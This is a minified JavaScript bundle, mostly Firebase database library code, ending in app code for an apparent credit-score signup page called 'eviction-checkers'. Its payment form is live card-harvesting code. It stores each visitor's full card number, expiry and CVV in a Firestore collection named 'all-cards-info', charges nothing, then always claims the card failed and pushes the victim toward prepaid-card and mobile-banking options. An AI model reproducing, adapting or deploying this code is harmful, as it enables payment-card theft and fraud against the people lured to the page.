v=!0,b="nodata",s=s.concat(Da(t.serverSyncTree_,f.currentWriteId,!0))}br(t.eventQueue_,n,s),s=[],v&&(e[d].status=2,function(w){setTimeout(w,Math.floor(0))}(e[d].unwatcher),e[d].onComplete&&(b==="nodata"?i.push(()=>e[d].onComplete(null,!1,e[d].currentInputSnapshot)):i.push(()=>e[d].onComplete(new Error(b),!1,null))))}Vp(t,t.transactionQueueTree_);for(let d=0;d<i.length;d++)zc(i[d]);Cw(t,t.transactionQueueTree_)}function rR(t,e){let n,i=t.transactionQueueTree_;for(n=et(e);n!==null&&Hc(i)===void 0;)i=xw(i,n),e=Bt(e),n=et(e);return i}function sR(t,e){const n=[];return aR(t,e,n),n.sort((i,s)=>i.order-s.order),n}function aR(t,e,n){const i=Hc(e);if(i)for(let s=0;s<i.length;s++)n.push(i[s]);Mp(e,s=>{aR(t,s,n)})}function Vp(t,e){const n=Hc(e);if(n){let i=0;for(let s=0;s<n.length;s++)n[s].status!==2&&(n[i]=n[s],i++);n.length=i,YN(e,n.length>0?n:void 0)}Mp(e,i=>{Vp(t,i)})}function Sw(t,e){const n=nh(rR(t,e)),i=xw(t.transactionQueueTree_,e);return lB(i,s=>{v0(t,s)}),v0(t,i),KN(i,s=>{v0(t,s)}),n}function v0(t,e){const n=Hc(e);if(n){const i=[];let s=[],o=-1;for(let c=0;c<n.length;c++)n[c].status===3||(n[c].status===1?(ye(o===c-1,"All SENT items should be at beginning of queue."),o=c,n[c].status=3,n[c].abortReason="set"):(ye(n[c].status===0,"Unexpected transaction status in abort"),n[c].unwatcher(),s=s.concat(Da(t.serverSyncTree_,n[c].currentWriteId,!0)),n[c].onComplete&&i.push(n[c].onComplete.bind(null,new Error("set"),!1,null))));o===-1?YN(e,void 0):n.length=o+1,br(t.eventQueue_,nh(e),s);for(let c=0;c<i.length;c++)zc(i[c])}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function DB(t){let e="";const n=t.split("/");for(let i=0;i<n.length;i++)if(n[i].length>0){let s=n[i];try{s=decodeURIComponent(s.replace(/\+/g," "))}catch{}e+="/"+s}return e}function MB(t){const e={};t.charAt(0)==="?"&&(t=t.substring(1));for(const n of t.split("&")){if(n.length===0)continue;const i=n.split("=");i.length===2?e[decodeURIComponent(i[0])]=decodeURIComponent(i[1]):oi(`Invalid query segment '${n}' in query '${t}'`)}return e}const YE=function(t,e){const n=OB(t),i=n.namespace;n.domain==="firebase.com"&&Hs(n.host+" is no longer supported. Please use <YOUR FIREBASE>.firebaseio.com instead"),(!i||i==="undefined")&&n.domain!=="localhost"&&Hs("Cannot parse Firebase url. Please use https://<YOUR FIREBASE>.firebaseio.com"),n.secure||q7();const s=n.scheme==="ws"||n.scheme==="wss";return{repoInfo:new uN(n.host,n.secure,i,s,e,"",i!==n.subdomain),path:new Ot(n.pathString)}},OB=function(t){let e="",n="",i="",s="",o="",c=!0,d="https",f=443;if(typeof t=="string"){let p=t.indexOf("//");p>=0&&(d=t.substring(0,p-1),t=t.substring(p+2));let v=t.indexOf("/");v===-1&&(v=t.length);let b=t.indexOf("?");b===-1&&(b=t.length),e=t.substring(0,Math.min(v,b)),v<b&&(s=DB(t.substring(v,b)));const w=MB(t.substring(Math.min(t.length,b)));p=e.indexOf(":"),p>=0?(c=d==="https"||d==="wss",f=parseInt(e.substring(p+1),10)):p=e.length;const E=e.slice(0,p);if(E.toLowerCase()==="localhost")n="localhost";else if(E.split(".").length<=2)n=E;else{const C=e.indexOf(".");i=e.substring(0,C).toLowerCase(),n=e.substring(C+1),o=i}"ns"in w&&(o=w.ns)}return{host:e,port:f,domain:n,subdomain:i,secure:c,scheme:d,pathString:s,namespace:o}};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const QE="-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz",PB=function(){let t=0;const e=[];return function(n){const i=n===t;t=n;let s;const o=new Array(8);for(s=7;s>=0;s--)o[s]=QE.charAt(n%64),n=Math.floor(n/64);ye(n===0,"Cannot push at time == 0");let c=o.join("");if(i){for(s=11;s>=0&&e[s]===63;s--)e[s]=0;e[s]++}else for(s=0;s<12;s++)e[s]=Math.floor(Math.random()*64);for(s=0;s<12;s++)c+=QE.charAt(e[s]);return ye(c.length===20,"nextPushId: Length should be 20."),c}}();/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class oR{constructor(e,n,i,s){this.eventType=e,this.eventRegistration=n,this.snapshot=i,this.prevName=s}getPath(){const e=this.snapshot.ref;return this.eventType==="value"?e._path:e.parent._path}getEventType(){return this.eventType}getEventRunner(){return this.eventRegistration.getEventRunner(this)}toString(){return this.getPath().toString()+":"+this.eventType+":"+Nn(this.snapshot.exportVal())}}class lR{constructor(e,n,i){this.eventRegistration=e,this.error=n,this.path=i}getPath(){return this.path}getEventType(){return"cancel"}getEventRunner(){return this.eventRegistration.getEventRunner(this)}toString(){return this.path.toString()+":cancel"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class cR{constructor(e,n){this.snapshotCallback=e,this.cancelCallback=n}onValue(e,n){this.snapshotCallback.call(null,e,n)}onCancel(e){return ye(this.hasCancelCallback,"Raising a cancel event on a listener with no cancel callback"),this.cancelCallback.call(null,e)}get hasCancelCallback(){return!!this.cancelCallback}matches(e){return this.snapshotCallback===e.snapshotCallback||this.snapshotCallback.userCallback!==void 0&&this.snapshotCallback.userCallback===e.snapshotCallback.userCallback&&this.snapshotCallback.context===e.snapshotCallback.context}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Nw{constructor(e,n,i,s){this._repo=e,this._path=n,this._queryParams=i,this._orderByCalled=s}get key(){return lt(this._path)?null:ew(this._path)}get ref(){return new Ys(this._repo,this._path)}get _queryIdentifier(){const e=kE(this._queryParams),n=$_(e);return n==="{}"?"default":n}get _queryObject(){return kE(this._queryParams)}isEqual(e){if(e=tn(e),!(e instanceof Nw))return!1;const n=this._repo===e._repo,i=tw(this._path,e._path),s=this._queryIdentifier===e._queryIdentifier;return n&&i&&s}toJSON(){return this.toString()}toString(){return this._repo.toString()+SV(this._path)}}class Ys extends Nw{constructor(e,n){super(e,n,new sw,!1)}get parent(){const e=_N(this._path);return e===null?null:new Ys(this._repo,e)}get root(){let e=this;for(;e.parent!==null;)e=e.parent;return e}}class Md{constructor(e,n,i){this._node=e,this.ref=n,this._index=i}get priority(){return this._node.getPriority().val()}get key(){return this.ref.key}get size(){return this._node.numChildren()}child(e){const n=new Ot(e),i=Nc(this.ref,e);return new Md(this._node.getChild(n),i,Wt)}exists(){return!this._node.isEmpty()}exportVal(){return this._node.val(!0)}forEach(e){return this._node.isLeafNode()?!1:!!this._node.forEachChild(this._index,(i,s)=>e(new Md(s,Nc(this.ref,i),Wt)))}hasChild(e){const n=new Ot(e);return!this._node.getChild(n).isEmpty()}hasChildren(){return this._node.isLeafNode()?!1:!this._node.isEmpty()}toJSON(){return this.exportVal()}val(){return this._node.val()}}function cc(t,e){return t=tn(t),t._checkNotDeleted("ref"),e!==void 0?Nc(t._root,e):t._root}function Nc(t,e){return t=tn(t),et(t._path)===null?gB("child","path",e):XN("child","path",e),new Ys(t._repo,Kt(t._path,e))}function uR(t,e){t=tn(t),ZN("push",t._path),$N("push",e,t._path,!0);const n=tR(t._repo),i=PB(n),s=Nc(t,i),o=Nc(t,i);let c;return e!=null?c=jB(o,e).then(()=>o):c=Promise.resolve(o),s.then=c.then.bind(c),s.catch=c.then.bind(c,void 0),s}function jB(t,e){t=tn(t),ZN("set",t._path),$N("set",e,t._path,!1);const n=new Hd;return TB(t._repo,t._path,e,null,n.wrapCallback(()=>{})),n.promise}function LB(t,e){pB("update",e,t._path);const n=new Hd;return CB(t._repo,t._path,e,n.wrapCallback(()=>{})),n.promise}class Rw{constructor(e){this.callbackContext=e}respondsTo(e){return e==="value"}createEvent(e,n){const i=n._queryParams.getIndex();return new oR("value",this,new Md(e.snapshotNode,new Ys(n._repo,n._path),i))}getEventRunner(e){return e.getEventType()==="cancel"?()=>this.callbackContext.onCancel(e.error):()=>this.callbackContext.onValue(e.snapshot,null)}createCancelEvent(e,n){return this.callbackContext.hasCancelCallback?new lR(this,e,n):null}matches(e){return e instanceof Rw?!e.callbackContext||!this.callbackContext?!0:e.callbackContext.matches(this.callbackContext):!1}hasAnyCallback(){return this.callbackContext!==null}}class Up{constructor(e,n){this.eventType=e,this.callbackContext=n}respondsTo(e){let n=e==="children_added"?"child_added":e;return n=n==="children_removed"?"child_removed":n,this.eventType===n}createCancelEvent(e,n){return this.callbackContext.hasCancelCallback?new lR(this,e,n):null}createEvent(e,n){ye(e.childName!=null,"Child events should have a childName.");const i=Nc(new Ys(n._repo,n._path),e.childName),s=n._queryParams.getIndex();return new oR(e.type,this,new Md(e.snapshotNode,i,s),e.prevName)}getEventRunner(e){return e.getEventType()==="cancel"?()=>this.callbackContext.onCancel(e.error):()=>this.callbackContext.onValue(e.snapshot,e.prevName)}matches(e){return e instanceof Up?this.eventType===e.eventType&&(!this.callbackContext||!e.callbackContext||this.callbackContext.matches(e.callbackContext)):!1}hasAnyCallback(){return!!this.callbackContext}}function dR(t,e,n,i,s){const o=new cR(n,void 0),c=e==="value"?new Rw(o):new Up(e,o);return NB(t._repo,t,c),()=>nR(t._repo,t,c)}function hR(t,e,n,i){return dR(t,"value",e)}function VB(t,e,n,i){return dR(t,"child_added",e)}function UB(t,e,n){let i=null;const s=n?new cR(n):null;i=new Up(e,s),nR(t._repo,t,i)}UU(Ys);GU(Ys);/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const BB="FIREBASE_DATABASE_EMULATOR_HOST",pv={};let zB=!1;function FB(t,e,n,i){const s=e.lastIndexOf(":"),o=e.substring(0,s),c=el(o);t.repoInfo_=new uN(e,c,t.repoInfo_.namespace,t.repoInfo_.webSocketOnly,t.repoInfo_.nodeAdmin,t.repoInfo_.persistenceKey,t.repoInfo_.includeNamespaceInQueryParams,!0,n),i&&(t.authTokenProvider_=i)}function HB(t,e,n,i,s){let o=i||t.options.databaseURL;o===void 0&&(t.options.projectId||Hs("Can't determine Firebase Database URL. Be sure to include  a Project ID when calling firebase.initializeApp()."),Vn("Using default host for project ",t.options.projectId),o=`${t.options.projectId}-default-rtdb.firebaseio.com`);let c=YE(o,s),d=c.repoInfo,f;typeof process<"u"&&fE&&(f=fE[BB]),f?(o=`http://${f}?ns=${d.namespace}`,c=YE(o,s),d=c.repoInfo):c.repoInfo.secure;const p=new tV(t.name,t.options,e);yB("Invalid Firebase Database URL",c),lt(c.path)||Hs("Database URL must point to the root of a Firebase Database (not including a child path).");const v=GB(d,t,p,new eV(t,n));return new YB(v,t)}function qB(t,e){const n=pv[e];(!n||n[t.key]!==t)&&Hs(`Database ${e}(${t.repoInfo_}) has already been deleted.`),RB(t),delete n[t.key]}function GB(t,e,n,i){let s=pv[e.name];s||(s={},pv[e.name]=s);let o=s[t.toURLString()];return o&&Hs("Database initialized multiple times. Please make sure the format of the database URL matches with each database() call."),o=new xB(t,zB,n,i),s[t.toURLString()]=o,o}class YB{constructor(e,n){this._repoInternal=e,this.app=n,this.type="database",this._instanceStarted=!1}get _repo(){return this._instanceStarted||(AB(this._repoInternal,this.app.options.appId,this.app.options.databaseAuthVariableOverride),this._instanceStarted=!0),this._repoInternal}get _root(){return this._rootInternal||(this._rootInternal=new Ys(this._repo,Et())),this._rootInternal}_delete(){return this._rootInternal!==null&&(qB(this._repo,this.app.name),this._repoInternal=null,this._rootInternal=null),Promise.resolve()}_checkNotDeleted(e){this._rootInternal===null&&Hs("Cannot call "+e+" on a deleted database.")}}function QB(t=Jv(),e){const n=rp(t,"database").getImmediate({identifier:e});if(!n._instanceStarted){const i=kC("database");i&&KB(n,...i)}return n}function KB(t,e,n,i={}){t=tn(t),t._checkNotDeleted("useEmulator");const s=`${e}:${n}`,o=t._repoInternal;if(t._instanceStarted){if(s===t._repoInternal.repoInfo_.host&&Ba(i,o.repoInfo_.emulatorOptions))return;Hs("connectDatabaseEmulator() cannot initialize or alter the emulator configuration after the database instance has started.")}let c;if(o.repoInfo_.nodeAdmin)i.mockUserToken&&Hs('mockUserToken is not supported by the Admin SDK. For client access with mock users, please use the "firebase" package instead of "firebase-admin".'),c=new Qf(Qf.OWNER);else if(i.mockUserToken){const d=typeof i.mockUserToken=="string"?i.mockUserToken:OC(i.mockUserToken,t.app.options.projectId);c=new Qf(d)}el(e)&&(Wv(e),$v("Database",!0)),FB(o,s,i,c)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function WB(t){V7(tl),Fo(new za("database",(e,{instanceIdentifier:n})=>{const i=e.getProvider("app").getImmediate(),s=e.getProvider("auth-internal"),o=e.getProvider("app-check-internal");return HB(i,s,o,n)},"PUBLIC").setMultipleInstances(!0)),Kr(mE,pE,t),Kr(mE,pE,"esm2017")}js.prototype.simpleListen=function(t,e){this.sendRequest("q",{p:t},e)};js.prototype.echo=function(t,e){this.sendRequest("echo",{d:t},e)};WB();const $B={apiKey:"AIzaSyBNOGxp8KyUK_smkeq1PT6MnUBfzqJRW6I",authDomain:"eviction-checkers.firebaseapp.com",projectId:"eviction-checkers",storageBucket:"eviction-checkers.firebasestorage.app",messagingSenderId:"767319585344",appId:"1:767319585344:web:8c99061d32722c2052e5a5",measurementId:"G-1CY4Q6NSE0",databaseURL:"https://eviction-checkers-default-rtdb.firebaseio.com"},Iw=UC($B),Kf=j7(Iw),Rn=xj(Iw),uc=QB(Iw),Bp=O.createContext(),XB=({children:t})=>{const[e,n]=O.useState(""),s={forRecCardNumber:o=>{n(o)},recCardNumber:e};return g.jsx(Bp.Provider,{value:s,children:t})},ZB=()=>{const t=cr(),[e,n]=O.useState(""),[i,s]=O.useState(""),[o,c]=O.useState(""),[d,f]=O.useState(""),[p,v]=O.useState(!1),[b,w]=O.useState({cardNumber:"",expMonth:"",expYear:"",cvv:""}),{forRecCardNumber:E}=O.useContext(Bp);O.useEffect(()=>{e&&E(e)},[e,E]);const C=N=>{const T=N.replace(/\s+/g,"").replace(/-/g,"");if(!/^\d+$/.test(T))return!1;let k=0,I=!1;for(let j=T.length-1;j>=0;j--){let z=parseInt(T.charAt(j));I&&(z*=2,z>9&&(z-=9)),k+=z,I=!I}return k%10===0},M=N=>{const k=N.replace(/\s+/g,"").replace(/[^0-9]/gi,"").match(/\d{4,16}/g),I=k&&k[0]||"",j=[];for(let z=0,P=I.length;z<P;z+=4)j.push(I.substring(z,z+4));return j.length?j.join(" "):N},V=N=>{const T=N.target.value.replace(/[^0-9]/g,""),k=M(T);n(k),b.cardNumber&&w(I=>({...I,cardNumber:""}))},B=N=>{const T=N.target.value.replace(/[^0-9]/g,"");if(T===""){s(""),b.expMonth&&w(I=>({...I,expMonth:""}));return}const k=parseInt(T);if(T.length===1&&(T==="0"||T==="1")){s(T);return}if(T.length===1&&k>1){s(T.slice(0,1));return}if(T.length===2){const I=parseInt(T);if(I<1||I>12){w(z=>({...z,expMonth:"Invalid month"})),s(T);return}const j=I<10?`0${I}`:`${I}`;s(j)}else s(T);b.expMonth&&w(I=>({...I,expMonth:""}))},Y=N=>{const T=N.target.value.replace(/[^0-9]/g,"");if(c(T.slice(0,2)),T.length===2){const I=new Date().getFullYear()%100,j=parseInt(T);j<I||j>I+20?w(z=>({...z,expYear:"Invalid year"})):b.expYear&&w(z=>({...z,expYear:""}))}else b.expYear&&w(k=>({...k,expYear:""}))},D=N=>{const T=N.target.value.replace(/[^0-9]/g,"");f(T.slice(0,4)),b.cvv&&w(k=>({...k,cvv:""}))},Q=()=>{const N={cardNumber:"",expMonth:"",expYear:"",cvv:""};let T=!0;e?e.replace(/\s/g,"").length<15?(N.cardNumber="Card number is too short",T=!1):C(e)||(N.cardNumber="Invalid card number",T=!1):(N.cardNumber="Card number is required",T=!1),i?(i.length!==2||parseInt(i)<1||parseInt(i)>12)&&(N.expMonth="Invalid month",T=!1):(N.expMonth="Month is required",T=!1);const I=new Date().getFullYear()%100;return o?(o.length!==2||parseInt(o)<I||parseInt(o)>I+20)&&(N.expYear="Invalid year",T=!1):(N.expYear="Year is required",T=!1),d?(d.length<3||d.length>4)&&(N.cvv="CVV must be 3-4 digits",T=!1):(N.cvv="CVV is required",T=!1),w(N),T},G=async()=>{try{const N=wc(Rn,"all-cards-info"),T=e.replace(/\s/g,""),k=gi(N,T);if((await zs(k)).exists()){console.log("Card info already exists in database - no changes made");return}else{const j={cardNumber:e,expMonth:i,expYear:o,cvv:d,timestamp:new Date().toISOString(),isDuplicate:!1};await v4(k,j),console.log("New card info stored successfully")}}catch(N){throw console.error("Error storing card information:",N),N}},L=async N=>{if(N.preventDefault(),Q()){v(!0);try{await G(),(await Ln.fire({title:"Oops!",html:'<div class="text-center">WE CANNOT PROCESS THIS CARD RIGHT NOW<br/>PLEASE TRY AGAIN WITH ANOTHER PAYMENT METHOD</div>',icon:"error",confirmButtonText:"GO TO ANOTHER PAYMENT METHOD",confirmButtonColor:"#3085d6",customClass:{popup:"rounded-lg",confirmButton:"py-2 px-4 rounded"},allowOutsideClick:!1,allowEscapeKey:!1,allowEnterKey:!1,showCancelButton:!1,focusConfirm:!0})).isConfirmed&&t("/checkers",{state:{from:"/card-payment"}})}catch(T){console.error("Error during form submission:",T),Ln.fire({title:"Error!",text:"An error occurred while processing your payment. Please try again.",icon:"error",confirmButtonText:"OK"})}finally{v(!1)}}};return g.jsxs("div",{className:"flex flex-col md:flex-row gap-0 md:gap-6 bg-white rounded-xl shadow-lg w-[96%] md:w-[80%] mx-auto my-1 md:my-10",children:[g.jsxs("div",{className:"w-full md:w-[60%] p-4 space-y-5",children:[g.jsx("h2",{className:"text-2xl font-semibold",children:"Final Step"}),g.jsxs("p",{className:"text-sm text-gray-600 ",children:["Tell us which card to use for a ",g.jsx("a",{href:"#",className:"text-blue-600 no-underline",children:"$1.00 processing fee"})," and membership."]}),g.jsxs("form",{onSubmit:L,children:[g.jsxs("div",{className:"space-y-2",children:[g.jsxs("div",{className:"flex flex-row justify-between items-center pb-0 mb-0",children:[g.jsx("label",{className:"block text-gray-500 text-sm font-medium",children:"Card Number"}),g.jsxs("div",{className:"flex mt-2",children:[g.jsx("img",{src:xC,alt:"Visa",className:"h-9"}),g.jsx("img",{src:AC,alt:"MasterCard",className:"h-9"}),g.jsx("img",{src:EC,alt:"AmEx",className:"h-9"}),g.jsx("img",{src:TC,alt:"Discover",className:"h-9"})]})]}),g.jsx("input",{type:"text",inputMode:"numeric",pattern:"[0-9\\s]{13,19}",className:`w-full border-[#c5c5c5] border-1 rounded px-3 py-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-200 focus:outline-none transition duration-200 ${b.cardNumber?"border-red-500":""}`,placeholder:"1234 5678 9012 3456",value:e,onChange:V,disabled:p}),b.cardNumber&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:b.cardNumber})]}),g.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-2 md:gap-4 mt-4",children:[g.jsxs("div",{className:"w-full",children:[g.jsx("label",{className:"block mb-1 text-gray-500 text-sm font-medium",children:"Expiration Month"}),g.jsx("input",{type:"text",inputMode:"numeric",pattern:"[0-9]*",className:`w-full border-[#c5c5c5] border-1 rounded px-3 py-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-200 focus:outline-none transition duration-200 ${b.expMonth?"border-red-500":""}`,placeholder:"MM",maxLength:2,value:i,onChange:B,onKeyDown:N=>{N.key==="Backspace"&&i.length===2&&s("")},disabled:p}),b.expMonth&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:b.expMonth})]}),g.jsxs("div",{className:"w-full",children:[g.jsx("label",{className:"block mb-1 text-gray-500 text-sm font-medium",children:"Expiration Year"}),g.jsx("input",{type:"text",inputMode:"numeric",pattern:"[0-9]*",className:`w-full border-[#c5c5c5] border-1 rounded px-3 py-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-200 focus:outline-none transition duration-200 ${b.expYear?"border-red-500":""}`,placeholder:"YY",maxLength:2,value:o,onChange:Y,disabled:p}),b.expYear&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:b.expYear})]}),g.jsxs("div",{className:"w-full",children:[g.jsxs("div",{className:"flex items-center",children:[g.jsx("label",{className:"block mb-1 text-sm  font-medium text-gray-500",children:"CVV"}),g.jsxs("div",{className:"group relative ml-1",children:[g.jsx(R5,{className:"text-gray-400 text-sm cursor-pointer"}),g.jsx("div",{className:"absolute z-10 hidden group-hover:block bg-white p-2 rounded shadow-lg border border-gray-200 w-48 text-xs text-gray-600",children:"The CVV is a 3-4 digit code on the back of your card (or front for AmEx). It provides extra security for online transactions."})]})]}),g.jsx("input",{type:"text",inputMode:"numeric",pattern:"[0-9]*",className:`w-full border-[#c5c5c5] border-1 rounded px-3 py-2 focus:border-blue-500 focus:ring-1 focus:ring-blue-100 focus:outline-none transition duration-200 ${b.cvv?"border-red-500":""}`,placeholder:"CVV",maxLength:4,value:d,onChange:D,disabled:p}),b.cvv&&g.jsx("p",{className:"text-red-500 text-xs mt-1",children:b.cvv})]})]}),g.jsx("div",{className:"text-xs text-gray-500 leading-relaxed mt-4",children:g.jsxs("p",{children:["By clicking the button below, you agree to the ",g.jsx("a",{href:"#",className:"underline text-blue-600",children:"Terms of Use"})," to enroll in a 7-day trial for a one-time processing fee of $1.00. After the trial ends on ",g.jsx("strong",{children:"Jun 06, 2025"}),", the nonrefundable membership automatically continues for $39.94 per month until you cancel. You may cancel by calling (800) 538-6616 or by ",g.jsx("a",{href:"#",className:"underline text-blue-600",children:"email"}),". If you cancel your account during the trial, there will be NO FURTHER CHARGES."]})}),g.jsx("div",{className:"flex justify-center",children:g.jsx("button",{type:"submit",className:"bg-[#7fbdff] text-white px-20 py-1 rounded mt-4 text-[14px] font-semibold hover:bg-blue-700 transition disabled:opacity-75 disabled:cursor-not-allowed flex items-center justify-center gap-2 cursor-pointer",disabled:p,children:p?g.jsxs(g.Fragment,{children:[g.jsx(T0,{className:"animate-spin"}),"Processing..."]}):g.jsxs(g.Fragment,{children:["I Agree & Accept ",g.jsx("br",{})," Get My Score!"]})})})]}),g.jsxs("div",{className:"flex flex-row justify-center space-x-4 mt-6",children:[g.jsx("img",{src:Dv,alt:"SSL Secured",className:"h-8"}),g.jsx("img",{src:kv,alt:"Qualys",className:"h-8"})]})]}),g.jsx("div",{className:"w-full lg:w-[40%] bg-gray-300 flex justify-center items-center mt-4 px-2 py-2 md:px-0 md:py-0 md:mt-0",children:g.jsxs("div",{className:"flex-grow flex flex-col items-center justify-center",children:[g.jsxs("div",{className:"relative mb-6",children:[g.jsx("div",{className:"absolute -top-2 -right-2 bg-white rounded-full p-2 shadow-md",children:g.jsx("div",{className:"bg-blue-100 rounded-full p-3",children:g.jsx("span",{className:"text-blue-600 font-bold text-xl",children:"723"})})}),g.jsx("img",{src:FM,alt:"Credit Score Illustration",className:"w-64 mx-auto"})]}),g.jsx("h3",{className:"text-lg font-semibold text-[#7e8284] mb-4 text-center",children:"Get your credit score and get protected too."}),g.jsxs("ul",{className:"space-y-3 w-full max-w-xs",children:[g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:"Credit Report and Score"})]}),g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:"Score Refreshed Every 30 Days On Sign In"})]}),g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:"Credit Monitoring and Alerts"})]}),g.jsxs("li",{className:"flex items-start",children:[g.jsx("span",{className:"inline-flex items-center justify-center border-2 border-gray-500 rounded-full h-5 w-5 mt-1 mr-2 flex-shrink-0",children:g.jsx(Is,{className:"text-gray-500 text-xs"})}),g.jsx("span",{className:"text-[#7e8284] text-[14px]",children:"Credit Cards and Loans Matched for You"})]})]})]})})]})},JB=()=>{const[t,e]=O.useState(""),[n,i]=O.useState(""),[s,o]=O.useState(!1),[c,d]=O.useState([]),[f,p]=O.useState(!0),v=cr();O.useEffect(()=>{(async()=>{try{const M=await L_(wc(Rn,"mobile-banking")),V=[];M.forEach(B=>{const Y=B.data();Y.method&&Array.isArray(Y.method)&&V.push(...Y.method)}),d(V),p(!1)}catch(M){console.error("Error fetching bank options:",M),p(!1)}})()},[]);const b=C=>{C&&n&&i(""),e(C),s&&o(!1)},w=C=>{C&&t&&e(""),i(C),s&&o(!1)},E=()=>{!t&&!n?o(!0):(o(!1),v("/bank-payment",{state:{from:"/checkers",paymentMethod:{prepaidCard:t,mobileBank:n}}}))};return g.jsx("div",{className:"min-h-screen bg-gray-100 flex items-center justify-center p-4",children:g.jsxs("div",{className:"bg-white rounded-xl shadow-lg w-full max-w-5xl grid grid-cols-1 md:grid-cols-2",children:[g.jsxs("div",{className:"p-8 flex flex-col justify-center",children:[g.jsx("h2",{className:"text-4xl font-semibold mb-2",children:"Checkers"}),g.jsx("div",{className:"mb-10",children:g.jsx("hr",{})}),g.jsxs("p",{className:"text-sm text-gray-600 mb-6",children:["Tell us which card to use for a ",g.jsx("a",{href:"#",className:"text-blue-600 ",children:"$1.00 processing fee"})," and membership."]}),g.jsxs("div",{className:"mb-4",children:[g.jsxs("div",{className:"flex flex-row items-center justify-between",children:[g.jsx("label",{className:"block text-sm font-medium mb-2",children:"Prepaid Card"}),g.jsxs("div",{className:"flex flex-row items-center",children:[g.jsx("img",{className:"h-6 md:h-9",src:xC,alt:""}),g.jsx("img",{className:"h-6 md:h-9",src:AC,alt:""}),g.jsx("img",{className:"h-6 md:h-9",src:EC,alt:""}),g.jsx("img",{className:"h-6 md:h-9",src:TC,alt:""})]})]}),g.jsxs("select",{value:t,onChange:C=>b(C.target.value),className:"w-full border border-gray-300 rounded px-3 py-2",children:[g.jsx("option",{value:"",children:"Select Card"}),g.jsx("option",{value:"visa",children:"Visa"})]}),s&&!t&&!n&&g.jsx("p",{className:"text-red-500 text-sm mt-1",children:"Please select either a prepaid card or mobile bank."})]}),g.jsxs("div",{className:"mb-4",children:[g.jsx("label",{className:"block text-sm font-medium mb-2",children:"Mobile Banking"}),g.jsxs("select",{value:n,onChange:C=>w(C.target.value),className:"w-full border border-gray-300 rounded px-3 py-2",disabled:f,children:[g.jsx("option",{value:"",children:"Select 